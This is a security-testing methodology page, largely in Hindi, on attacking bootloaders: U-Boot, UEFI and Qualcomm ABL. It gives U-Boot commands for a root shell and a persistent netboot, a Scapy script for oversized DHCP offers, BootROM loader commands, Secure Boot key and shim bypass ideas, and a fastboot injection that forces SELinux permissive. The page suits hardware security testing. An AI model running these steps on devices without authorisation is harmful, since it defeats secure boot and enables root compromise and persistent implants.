# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

डिवाइस startup configurations को modify करने और U-Boot तथा UEFI-class loaders जैसे bootloaders की testing के लिए निम्नलिखित steps recommended हैं। शुरुआती code execution प्राप्त करने, signature/rollback protections का assessment करने और recovery या network-boot paths का दुरुपयोग करने पर focus करें।

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Interpreter shell access करें
- Boot के दौरान `bootcmd` execute होने से पहले किसी ज्ञात break key (अक्सर कोई भी key, 0, space या board-specific "magic" sequence) को दबाकर U-Boot prompt पर जाएँ।

2. Boot state और variables inspect करें
- उपयोगी commands:
- `printenv` (environment dump करें)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Root shell प्राप्त करने के लिए boot arguments modify करें
- `init=/bin/sh` append करें, ताकि kernel सामान्य init के बजाय shell पर drop हो:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. अपने TFTP server से Netboot करें
- Network configure करें और LAN से kernel/fit image fetch करें:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Environment के माध्यम से changes persist करें
- यदि env storage write-protected नहीं है, तो control persist किया जा सकता है:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे variables की जाँच करें, जो fallback paths को प्रभावित करते हैं। गलत configured values shell में बार-बार break करने की अनुमति दे सकती हैं।

6. Debug/unsafe features check करें
- निम्नलिखित देखें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के माध्यम से `loady`/`loads` करने की क्षमता, untrusted media से `env import`, और signature checks के बिना loaded kernels/ramdisks।

7. U-Boot image/verification testing
- यदि platform FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered दोनों images आज़माएँ:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` का अभाव या legacy `verify=n` behavior अक्सर arbitrary payloads को boot करने की अनुमति देता है।
- केवल simple allow/deny result पर न रुकें: हालिया FIT research से पता चला है कि verification path स्वयं pre-auth attack surface हो सकता है। Externally stored FIT data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables` और overlay / `extra-conf` handling पर negative-testing करें।
- यदि आपके पास matching source tree है, तो वास्तविक hardware को छूने से पहले U-Boot sandbox में FIT verification behaviour reproduce करने के लिए `test/vboot/vboot_test.sh` एक fast तरीका है।

8. Standard Boot (`bootstd`), `extlinux` और script bootflows
- Modern U-Boot builds में `bootcmd` अक्सर Standard Boot के wrapper के रूप में होता है। इसका अर्थ है कि writable media, PXE या SPI flash वास्तविक trust boundary बन सकते हैं, भले ही visible environment harmless दिखे।
- `extlinux` bootmeth `/` और `/boot` के अंतर्गत `extlinux/extlinux.conf` खोजता है; script bootmeth पहले `boot.scr.uimg` और फिर `boot.scr` खोजता है। Network boot पर script filename `boot_script_dhcp` से आ सकता है।
- उपयोगी triage commands:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Test करने योग्य abuse cases: `boot_targets` में attacker-controlled USB/SD media का पहले आना, writable `/boot/extlinux/extlinux.conf`, rogue TFTP द्वारा `boot.scr` उपलब्ध कराना, या `script_offset_f` के माध्यम से SPI-backed script execution।
- यदि platform FIT verification पर निर्भर है, तो सुनिश्चित करें कि configurations configuration level पर signed हों, केवल per-image नहीं; किसी एक required key को स्वीकार करने की तुलना में `required-mode=all` अधिक मजबूत है।

## Network-boot surface (DHCP/PXE) and rogue servers

9. PXE/DHCP parameter fuzzing
- U-Boot के legacy BOOTP/DHCP handling में memory-safety issues रहे हैं। उदाहरण के लिए, CVE‑2024‑42040 crafted DHCP responses के माध्यम से memory disclosure का वर्णन करता है, जो U-Boot memory से bytes leak करके wire पर वापस भेज सकते हैं। DHCP/PXE code paths को अत्यधिक लंबे/edge-case values (option 67 bootfile-name, vendor options, file/servername fields) के साथ exercise करें और hangs/leaks observe करें।
- Netboot के दौरान boot parameters को stress करने के लिए Minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- यह भी validate करें कि PXE filename fields को OS-side provisioning scripts से chain किए जाने पर बिना sanitization के shell/loader logic में pass तो नहीं किया जाता।

10. Rogue DHCP server command injection testing
- एक rogue DHCP/PXE service setup करें और filename या options fields में characters inject करने का प्रयास करें, ताकि boot chain के बाद के stages में command interpreters तक पहुँचा जा सके। Metasploit का DHCP auxiliary, `dnsmasq` या custom Scapy scripts उपयोगी हैं। पहले lab network को isolate करना सुनिश्चित करें।

## SoC ROM recovery modes that override normal boot

कई SoCs एक BootROM "loader" mode expose करते हैं, जो flash images invalid होने पर भी USB/UART के माध्यम से code स्वीकार करता है। यदि secure-boot fuses blown नहीं हैं, तो यह chain में बहुत शुरुआती स्तर पर arbitrary code execution प्रदान कर सकता है।

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) या `imx-usb-loader`।
- Example: `imx-usb-loader u-boot.imx` RAM से custom U-Boot push और run करने के लिए।
- Allwinner (FEL)
- Tool: `sunxi-fel`।
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`।
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`।
- Example: loader stage करने और custom U-Boot upload करने के लिए `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`।

Assess करें कि device में secure-boot eFuses/OTP burned हैं या नहीं। यदि नहीं, तो BootROM download modes अक्सर किसी भी higher-level verification (U-Boot, kernel, rootfs) को bypass करके आपके first-stage payload को सीधे SRAM/DRAM से execute करते हैं।

## UEFI/PC-class bootloaders: quick checks

11. ESP tampering, rollback और key-enrollment testing
- EFI System Partition (ESP) mount करें और loader components की जाँच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
- जहाँ संभव हो, OS से Secure Boot state और key databases dump करें:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- यदि platform Setup Mode में है, unauthenticated key enrollment स्वीकार करता है, या test/default Platform Key (PKfail class) के साथ ship होता है, तो local admin या physical attacker अपना KEK/db enroll कर सकता है और arbitrary EFI binaries boot करते हुए भी Secure Boot को “enabled” दिखा सकता है।
- यदि Secure Boot revocations (dbx) current नहीं हैं, तो downgraded या known-vulnerable signed boot components के साथ boot करने का प्रयास करें। यदि platform अभी भी पुराने shims/bootmanagers पर trust करता है, तो persistence प्राप्त करने के लिए अक्सर ESP से अपना kernel या `grub.cfg` load किया जा सकता है।

12. Stale shim / SBAT / dbx revocation testing
- पुराने Microsoft-signed shims और vendor forks, यदि revocations stale हों, तो BYOVD-style bootkit path के रूप में कार्य कर सकते हैं। Isolated lab में ESP पर historically vulnerable shim रखें और अपने `grubx64.efi` या kernel को chainload करने का प्रयास करें।
- Quick triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- यदि shim revocation list में होने के बावजूद run करता है, तो firmware/OS में stale `dbx` updates हैं या वह ऐसे forked loader पर trust करता है जिसने upstream SBAT protections inherit नहीं की हैं।

13. Boot logo parsing bugs (LogoFAIL class)
- कई OEM/IBV firmwares DXE में image-parsing flaws के प्रति vulnerable थे, जो boot logos process करते हैं। यदि attacker vendor-specific path (जैसे `\EFI\<vendor>\logo\*.bmp`) के अंतर्गत ESP पर crafted image रख सकता है और reboot कर सकता है, तो Secure Boot enabled होने पर भी early boot के दौरान code execution संभव हो सकता है। Test करें कि platform user-supplied logos स्वीकार करता है या नहीं और क्या वे paths OS से writable हैं।


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Android 16 devices पर, जो Qualcomm के ABL का उपयोग करके **Generic Bootloader Library (GBL)** load करते हैं, validate करें कि ABL `efisp` partition से load किए जाने वाले UEFI app को **authenticate** करता है या नहीं। यदि ABL केवल UEFI app की **presence** check करता है और signatures verify नहीं करता, तो `efisp` पर write primitive boot के समय **pre-OS unsigned code execution** बन जाती है।

Practical checks and abuse paths:

- **efisp write primitive**: आपको custom UEFI app को `efisp` में write करने का कोई तरीका चाहिए (root/privileged service, OEM app bug, recovery/fastboot path)। इसके बिना GBL loading gap directly reachable नहीं है।
- **fastboot OEM argument injection** (ABL bug): कुछ builds `fastboot oem set-gpu-preemption` में extra tokens स्वीकार करते हैं और उन्हें kernel cmdline में append करते हैं। इसका उपयोग permissive SELinux force करने और protected partition writes enable करने के लिए किया जा सकता है:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
यदि device patched है, तो command को extra arguments reject करने चाहिए।
- **Bootloader unlock via persistent flags**: एक boot-stage payload persistent unlock flags (जैसे `is_unlocked=1`, `is_unlocked_critical=1`) flip कर सकता है, जिससे OEM server/approval gates के बिना `fastboot oem unlock` emulate किया जा सके। अगले reboot के बाद यह एक durable posture change होता है।

Defensive/triage notes:

- Confirm करें कि ABL `efisp` से प्राप्त GBL/UEFI payload पर signature verification करता है या नहीं। यदि नहीं, तो `efisp` को high-risk persistence surface मानें।
- Track करें कि ABL fastboot OEM handlers argument counts validate करने और additional tokens reject करने के लिए patched हैं या नहीं।

## Hardware caution

Early boot के दौरान SPI/NAND flash के साथ interact करते समय सावधान रहें (जैसे reads bypass करने के लिए pins ground करना) और हमेशा flash datasheet consult करें। गलत समय पर किए गए shorts device या programmer को corrupt कर सकते हैं।

## Notes and additional tips

- Environment blobs को RAM और storage के बीच move करने के लिए `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ; कुछ platforms removable media से authentication के बिना env import करने की अनुमति देते हैं।
- Linux-based systems जो `extlinux.conf` के माध्यम से boot होते हैं, उनमें boot partition पर `APPEND` line modify करना (जैसे `init=/bin/sh` या `rd.break` inject करना) अक्सर पर्याप्त होता है, जब signature checks enforced न हों।
- यदि target dual-slot / A/B updates का उपयोग करता है, तो [firmware analysis overview](README.md) में anti-rollback और slot-desync techniques की समीक्षा करें, ताकि bootloader के बाहर updater-only trust gaps छूट न जाएँ।
- यदि userland `fw_printenv/fw_setenv` उपलब्ध कराता है, तो validate करें कि `/etc/fw_env.config` वास्तविक env storage से match करता है। गलत configured offsets से आप गलत MTD region read/write कर सकते हैं।

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
